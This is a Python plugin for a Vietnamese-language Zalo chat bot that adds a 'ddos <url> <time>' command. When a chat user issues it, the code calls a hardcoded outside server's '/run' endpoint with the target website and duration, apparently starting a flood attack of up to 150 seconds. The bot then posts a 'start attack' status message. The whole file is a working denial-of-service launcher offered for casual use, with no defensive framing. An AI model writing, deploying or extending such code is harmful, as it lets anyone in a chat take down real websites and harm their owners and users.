import time
import json
import requests
from zlapi.models import Message

MAX_USER_TIME = 150
COOLDOWN_SECONDS = 300  # 5 phut
last_called_times = {}

def handle_attack_command(message, message_object, thread_id, thread_type, author_id, client):
    parts = message.strip().split()
    if len(parts) < 3:
        client.replyMessage(
            Message(text="⚠️Dùng Đúng Cú Pháp Nhé Bạn: ddos <url> <time>"),
            message_object, thread_id=thread_id, thread_type=thread_type, ttl=10000)
        return

    url = parts[1].strip()
    try:
        duration = int(parts[2].strip())
        if duration > MAX_USER_TIME:
            duration = MAX_USER_TIME
    except ValueError:
        client.replyMessage(
            Message(text="❌Thời Gian Phải Là Số!"),
            message_object, thread_id=thread_id, thread_type=thread_type, ttl=8000)
        return

    now = int(time.time())
    last_called = last_called_times.get(author_id, 0)

    if now - last_called < COOLDOWN_SECONDS:
        remaining = COOLDOWN_SECONDS - (now - last_called)
        minutes = remaining // 60
        seconds = remaining % 60
        client.replyMessage(
            Message(text=f"⏳Bạn Cần Đợi {minutes} Phút {seconds} Giây Nữa Để Dùng Lại Lệnh Này ."),
            message_object, thread_id=thread_id, thread_type=thread_type, ttl=8000)
        return

    # Gui API - du loi van coi la thanh cong
    api_endpoint = f"http://13.212.180.237:3000/run?web={url}&time={duration}"
    try:
        requests.get(api_endpoint, timeout=5)
    except:
        pass  # Khong quan tam loi gi

    last_called_times[author_id] = now  # Cap nhat thoi gian sau khi goi

    time_str = time.strftime("%H:%M:%S %d/%m/%Y", time.localtime(now))
    author_name = getattr(getattr(message_object, 'author', None), 'name', None)
    caller = f"@{author_name}" if author_name else f"UID:{author_id}"

    response_data = {
        "Status": "✨🗿🚦 Bắt Đầu Tấn Công 🛸🚥✨",
        "Caller": caller,
        "PID": now,
        "Website": url,
        "Time": f"{duration} Giây",
        "MaxTime": MAX_USER_TIME,
        "Method": "flood",
        "StartTime": time_str
    }

    json_text = f"```json\n{json.dumps(response_data, indent=2, ensure_ascii=False)}\n```"

    client.replyMessage(
        Message(text=json_text),
        message_object, thread_id=thread_id, thread_type=thread_type, ttl=20000)

def get_mitaizl():
    return {
        'ddos': handle_attack_command
    }        